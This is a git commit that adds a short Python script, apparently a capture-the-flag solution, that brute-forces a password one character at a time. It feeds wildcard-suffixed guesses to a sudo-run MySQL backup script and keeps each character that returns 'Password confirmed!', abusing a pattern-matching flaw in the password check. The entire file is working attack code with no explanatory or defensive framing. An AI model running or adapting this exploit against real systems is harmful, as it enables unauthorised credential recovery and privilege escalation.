42a7b8c6c746089eb482bc6e0b4f92b93d26b551
Hamdi Sevben <sevbenhamdi@gmail.com>
2024-02-05 04:07:44 +0300

    Create script1.py

---
+++ Brute_Force/script1.py
@@ -0,0 +1,17 @@
+import string
+import subprocess
+all = list(string.ascii_letters + string.digits)
+password = ""
+found = False
+
+while not found:
+    for character in all:
+        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+
+        if "Password confirmed!" in output:
+            password += character
+            print(password)
+            break
+    else:
+        found = True
